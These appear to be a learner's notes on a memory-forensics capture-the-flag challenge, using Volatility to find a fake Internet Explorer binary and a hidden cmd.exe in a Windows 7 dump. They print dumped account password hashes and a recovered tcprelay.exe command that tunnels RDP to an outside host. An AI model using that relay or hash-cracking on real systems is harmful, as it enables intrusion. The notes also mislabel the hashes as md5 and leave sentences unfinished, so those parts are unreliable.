## ch2
### imageinfo
```txt
volatility -f ch2.dmp --profile=Win7SP1x86 imageinfo

INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 (Instantiated with Win7SP1x86)
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/Documents/volatility/ch2/ch2.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82929be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x8292ac00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2013-01-12 16:59:18 UTC+0000
     Image local date and time : 2013-01-12 17:59:18 +0100
```
It's a memory dump of a process, so not all commands are available.

We can see the registry keys put in memory using the `printkeys` plugin. The local machine name can be found using 
```txt
volatility -f ch2.dmp --profile=Win7SP1x86 printkey -K "ControlSet001\Control\computername\activecomputername"
Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ActiveComputerName (V)
Last updated: 2013-01-12 16:38:14 UTC+0000

Subkeys:

Values:
REG_SZ        ComputerName    : (V) WIN-ETSA91RKCFP
```

## passwords
We can retrieve the password hashes using `hashdump`
```txt
volatility -f ch2.dmp --profile=Win7SP1x86 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John Doe:1000:aad3b435b51404eeaad3b435b51404ee:b9f917853e3dbf6e6831ecce60725930:::
```

using `hash-identifier`  we can see that passwords are encoded using md5
crackstation gives us the following decrypted password for user `John Doe`.

- hidden cmd.exe process (pstree) with pid 1616
- psxview
	- pid 1616 with ppid 2772
	- pid 2772 is iexplore.exe
		- ppid explorer.exe
			- has lots of children, especially another iexplorer
	- pid 3044

```
 0x87ac6030:explorer.exe                             2548   2484     24    766 2013-01-12 16:40:27 UTC+0000
. 0x87b6b030:iexplore.exe                            2772   2548      2     74 2013-01-12 16:40:34 UTC+0000
.. 0x89898030:cmd.exe                                1616   2772      2    101 2013-01-12 16:55:49 UTC+0000
```
- dlllist
	- `volatility -f ch2.dmp --profile=Win7SP0x86 dlllist -p 2772,1616,3044
	- it show that one of the process has a cmdline that points to internet explorer, whereas the other one uses a false iexplorer in appdata roaming, replacing the lnk file with an executable with the same name. If the user had launched the app via the link, it 
	- user32.dll is used by the fake process because this dll is needed to launch cmd.
	- 

### Investigating pid 1616
using consoles plugin, we get the following:
```txt
**************************************************
ConsoleProcess: conhost.exe Pid: 2168
Console: 0x1081c0 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe
AttachedProcess: cmd.exe Pid: 1616 Handle: 0x64
----
CommandHistory: 0x427a60 Application: tcprelay.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427890 Application: whoami.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427700 Application: cmd.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
----
Screen 0x416348 X:80 Y:300
```

tcprelay.exe, a legitimate service for (?) is used before whoami and cmd.exe.
Looking at the memory dump for tcprelay.exe, we get :
```txt
  tcprelay.exe
  tcprelay.exe
  tcprelay.exe
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
```




